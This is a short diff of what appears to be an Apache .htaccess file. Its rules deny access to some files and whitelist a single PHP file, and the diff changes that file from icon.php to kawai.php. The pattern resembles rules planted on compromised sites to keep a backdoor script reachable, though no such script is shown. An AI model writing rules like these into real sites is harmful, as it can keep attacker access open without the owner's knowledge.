@@ -25,7 +25,7 @@ Order allow,deny
 deny from all
 </FilesMatch>
 
-<FilesMatch "^(icon.php)$">
+<FilesMatch "^(kawai.php)$">
     Order Allow,Deny
     Allow from all
 </FilesMatch>
